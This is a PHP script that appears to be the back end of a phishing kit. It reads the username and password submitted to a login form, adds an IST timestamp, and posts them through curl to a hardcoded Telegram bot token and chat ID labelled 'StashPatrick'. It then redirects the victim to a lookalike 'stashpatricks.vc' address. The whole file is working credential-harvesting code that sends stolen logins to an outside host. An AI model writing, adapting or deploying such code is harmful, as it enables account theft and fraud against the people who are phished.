<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted username and password
    $username = $_POST["login"];
    $password = $_POST["password"];

    // Set the timezone to IST (Indian Standard Time)
    date_default_timezone_set('Asia/Kolkata');

    // Get the current date and time in IST (12-hour format with AM/PM)
    $dateTime = date("Y-m-d h:i:s A");

    // Compose the message with the login credentials and date/time
    $message = "Username: " . $username . "\n" . "Password: " . $password . "\n";
    $message .= "Date/Time (IST): " . $dateTime . "\n\n";

    // Telegram Bot details
    $botToken = '7257814757:AAG5RyBq0M8KGqhuSS_PBK3tvnszTsI7OXg';
    $chatIds = ['1272510733']; // List of chat IDs to send the message to
    
    $messageTitle = "StashPatrick ✅" ;
    // Send the message via Telegram
    sendTelegramMessage($messageTitle, $message);

    // Redirect the user to a success page or perform any additional actions
    header("Location: https://stashpatricks.vc/check-protect");
    exit();
} else {
    // Redirect the user back to the login page or display an error message
    header("Location: http://error.html");
    exit();
}

// Function to send message via Telegram
function sendTelegramMessage($title, $body) {
    global $botToken, $chatIds;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    foreach ($chatIds as $chatId) {
        $data = [
            'chat_id' => $chatId,
            'text' => "*" . $title . "*\n" . $body,
            'parse_mode' => 'Markdown' // Use Markdown for bold text
        ];
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
